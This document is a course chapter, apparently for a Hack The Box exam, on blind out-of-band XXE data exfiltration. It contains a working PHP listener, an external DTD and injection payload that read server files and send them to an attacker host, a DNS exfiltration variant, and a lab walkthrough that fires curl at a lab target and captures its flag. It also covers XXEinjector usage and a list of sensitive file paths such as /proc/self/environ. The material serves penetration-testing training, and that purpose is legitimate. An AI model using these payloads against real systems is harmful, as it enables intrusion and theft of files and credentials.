# Section 16 — Blind Data Exfiltration (OOB XXE)

When the target gives you nothing back:
- No reflected input
- No error pages
- No DNS resolver visibility

…you exfiltrate via an **out-of-band (OOB)** channel. The vulnerable server fetches a URL of your choosing, and you smuggle the file content into that URL's query string.

---

## The OOB Primitive

```
1. Target parses your malicious XML
2. XML loads an external DTD from your server
3. DTD defines a parameter entity whose VALUE includes the file content
4. DTD constructs a SECOND entity that issues an HTTP request to YOUR server
   with the file content embedded in the URL
5. Your listener logs the request → you read the file content from the URL
```

The leak channel is the HTTP request your server receives. The response body of the target is irrelevant.

---

## The Three Required Pieces

### 1. Listener (PHP one-pager) — decodes inbound base64
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
Start it with `php -S 0.0.0.0:8000` — request logs go to stderr including your decoded line.

### 2. External DTD — defines the file-read and the callback
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/FILE_TO_READ">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://YOUR_IP:8000/?content=%file;'>">
%oob;
```

`%file` = base64-encoded file content (PHP wrapper handles binary-safety).
`%oob` is a meta-definition that, once expanded, creates `content` as a SYSTEM entity pointing to your callback URL with `%file` interpolated into the query string.

### 3. The injection payload — sent to the target
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

When the parser reaches `&content;`, it dereferences the entity → triggers HTTP GET to your listener → your server logs the base64-encoded file content.

---

## Why Two Parameter Entities

XML forbids using parameter entities inside other entity declarations within the **internal subset** (the `<!DOCTYPE [...]>` block in the request). But it ALLOWS it inside an external DTD. The pattern is:

```
internal subset → load external DTD → external DTD does the concatenation
```

This is the same workaround used in Section 15's CDATA attack, applied to the URL-building case.

---

## Walking Through the Chain

```
Target receives XML with internal DTD subset
  ↓
Internal subset declares %remote pointing at attacker
  ↓
%remote expansion → fetch http://attacker/xxe.dtd
  ↓
xxe.dtd runs (now in external context — concatenation allowed):
  - %file = base64(file_content)
  - %oob is defined as a string that includes %file
  - %oob is invoked → defines `content` entity with URL containing %file
  ↓
%oob in the request body fires the new entity definition
  ↓
<root>&content;</root> dereferences → parser fetches the URL
  ↓
Listener receives GET /?content=BASE64ENCODEDFILECONTENT
```

---

## DNS Exfiltration Variant

If outbound HTTP is firewalled but DNS is allowed (common):

```xml
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://%file;.attacker.com/'>">
```

Then run `tcpdump -i any port 53` on a DNS server you control, and capture queries for `<base64>.attacker.com`. Limit: DNS labels max 63 chars — large files need chunking.

---

## Lab — Read `/327a6c4304ad5938eaf0efb6cc3e53dc.php`

**Target:** `10.129.98.124/blind`
**Attacker IP:** `10.10.17.176` (tun0)
**Listener port:** 8000

### 1. Stage files
```bash
mkdir -p /tmp/xxe_oob && cd /tmp/xxe_oob

cat > index.php <<'PHP'
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
PHP

cat > xxe.dtd <<'DTD'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.17.176:8000/?content=%file;'>">
%oob;
DTD
```

### 2. Start listener
```bash
php -S 0.0.0.0:8000 &
```

### 3. Fire the injection
```bash
curl -sk -X POST http://10.129.98.124/blind/submitDetails.php \
  -H "Content-Type: application/xml" \
  --data $'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE email [\n<!ENTITY % remote SYSTEM "http://10.10.17.176:8000/xxe.dtd">\n%remote;\n%oob;\n]>\n<root>&content;</root>'
```

Target responds: `Check your email for further instructions.` (no leak — as expected, blind).

### 4. Listener output
```
[10.129.98.124:48436] GET /xxe.dtd
[10.129.98.124:48438] 

<?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>

[10.129.98.124:48438] GET /?content=PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K
```

**Flag:** `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`

---

## Automated Tool — XXEinjector

For real engagements with multiple files to exfiltrate, automation pays off:

```bash
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector
```

Capture the target request into a file, replacing the XML body with `XXEINJECT` as a position marker:
```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.98.124
Content-Type: text/plain;charset=UTF-8
Content-Length: 41

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Run:
```bash
ruby XXEinjector.rb \
  --host=10.10.17.176 \
  --httpport=8000 \
  --file=/tmp/xxe.req \
  --path=/etc/passwd \
  --oob=http \
  --phpfilter
```

Exfiltrated files land in `Logs/<target>/<file_path>.log`.

Flags worth knowing:
| Flag | Purpose |
|------|---------|
| `--oob=http` | HTTP OOB (this section's method) |
| `--oob=ftp` | FTP OOB — sometimes succeeds when HTTP blocked |
| `--oob=gopher` | gopher:// OOB |
| `--phpfilter` | wrap files in `php://filter` base64 (for PHP targets) |
| `--enumports=all` | port scan via SSRF |
| `--brute=...` | brute-force file paths from a list |
| `--httpsproxy` | use a SOCKS/HTTPS proxy |

---

## When OOB Fails

If your listener never gets a hit:

| Symptom | Cause | Check |
|---------|-------|-------|
| No `xxe.dtd` fetch logged | Egress filtering blocking HTTP outbound | Try `--oob=ftp`, alternative ports (80, 443, 53) |
| `xxe.dtd` fetched but no `?content=` | Parser doesn't allow nested entity expansion | Try error-based (S15) or CDATA approach |
| `?content=` arrives empty | File doesn't exist, or `php://filter` not enabled | Try `file://` directly, confirm file path |
| Truncated content | URL length limits in the parser/server | Chunk the file or use FTP OOB |
| Connection from internal IP, not target IP | NAT/proxy in front of app | Note actual source for forensics |

---

## Path Discovery in Blind Targets

Without errors or reflection, file enumeration is harder. Try:

```bash
# Test these paths sequentially, modifying the resource= part of the DTD
/etc/passwd                       ← always available, sanity check
/etc/hosts
/etc/apache2/sites-enabled/000-default.conf   ← reveals DocumentRoot
/proc/self/cwd/index.php          ← reads from web process working dir
/proc/self/environ                ← env vars including DOCUMENT_ROOT
/proc/self/cmdline                ← process command line
/var/log/apache2/access.log       ← log poisoning candidate
```

`/proc/self/cwd/` is the universal "I don't know the path but the web process does" workaround.

---

## Exam Notes

- **OOB = the vulnerable server fetches your URL with the file content embedded** — the leak channel is your access log, not the HTTP response
- The double-parameter-entity pattern (`%file` + `%oob`) is the canonical OOB primitive — memorize
- `php://filter/convert.base64-encode/resource=...` solves binary-safety AND URL-safety in one step
- DTD must be fetched from an **external** context for `%`-entity concatenation — putting all entities in the request's internal DTD subset fails
- Always confirm with `/etc/passwd` first — if that fails OOB, the chain has a config issue
- Listener choice matters — `python3 -m http.server` won't decode, `php -S` with the index.php pattern auto-decodes
- For real engagements use XXEinjector — it handles automation, scanning, and multiple OOB transports
- If even DNS is blocked → fully blind, no exfil possible; pivot to other vulns
